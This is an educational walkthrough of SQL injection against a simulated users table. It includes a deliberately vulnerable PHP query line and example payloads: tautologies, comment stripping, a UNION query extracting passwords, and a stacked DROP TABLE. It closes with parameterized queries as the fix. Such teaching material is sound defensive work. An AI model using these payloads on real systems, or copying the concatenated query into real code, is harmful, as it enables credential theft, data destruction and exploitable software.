Simulated users table (matches the in-memory DB in script.js):

CREATE TABLE users (
  id       INTEGER PRIMARY KEY,
  username TEXT,
  password TEXT,
  email    TEXT,
  role     TEXT
);

Normal request

URL: ?id=1 — Backend code (vulnerable): $sql = "SELECT * FROM users WHERE id=" . $_GET['id'];

SELECT * FROM users WHERE id=1;
-- Returns: the single row for admin

Boolean / always-true injection

URL: ?id=1 OR 1=1

SELECT * FROM users WHERE id=1 OR 1=1;

1=1 is always true → WHERE is always true → every row returned. Equivalent to:

SELECT * FROM users;

String tautology

URL: ?id=1 OR 'a'='a'

SELECT * FROM users WHERE id=1 OR 'a'='a';

Same effect: the OR condition is always true. Works even if the developer added single-quote escaping for strings but forgot to cast the numeric field.

Comment stripping

URL: ?id=1--

SELECT * FROM users WHERE id=1-- (rest of query discarded)

In a longer query like WHERE id=1-- AND active=1 AND role='user', the -- discards the AND conditions, bypassing access checks.

UNION-based data exfiltration

URL: ?id=0 UNION SELECT 1,username,password,role FROM users--

SELECT * FROM users WHERE id=0
UNION SELECT 1,username,password,role FROM users--;

id=0 matches nothing (intentional — keeps the first SELECT empty). The UNION appends all rows from users with the chosen columns. The attacker picks which columns to extract, including passwords.

Destructive injection

URL: ?id=1; DROP TABLE users--

SELECT * FROM users WHERE id=1;
DROP TABLE users;

The semicolon starts a new SQL statement. DROP TABLE permanently deletes the entire table and all its data. The -- discards anything the backend appended after the parameter.

Why numeric fields are especially easy to inject

  • String fields wrap input in quotes: WHERE username='input' → attacker needs a ' to escape the string
  • Numeric fields have NO quotes: WHERE id=input → SQL operators can be appended directly
  • Incorrect "fix" (still vulnerable): WHERE id='$input' → makes it a string comparison but still injectable with ' OR '1'='1

The correct fix — parameterized queries (prepared statements):

SELECT * FROM users WHERE id=?
-- value passed separately, never executed as SQL
-- $stmt->bind_param("i", $id); — type-checked, not concatenated
